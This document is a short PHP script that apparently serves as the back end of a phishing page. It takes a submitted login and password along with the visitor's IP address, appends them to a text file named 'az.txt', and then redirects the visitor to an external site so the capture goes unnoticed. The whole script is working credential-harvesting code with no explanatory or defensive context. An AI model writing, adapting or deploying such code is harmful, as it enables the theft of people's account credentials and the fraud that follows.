<?
session_start();

$ip = GETENV("REMOTE_ADDR");
$login = $_POST['login'];
$password=$_POST['password'];
$counter=$_POST['counter'];
$location_counter = "az.txt";
$counterr = join('', file($location_counter));
$fp = fopen($location_counter,"a+");
$message = $login."#".$password." ".$ip."\r\n";
fputs($fp, $message);
fclose($fp);



header("Location: http://starautomation.net/images/demo/initsec.html");
?>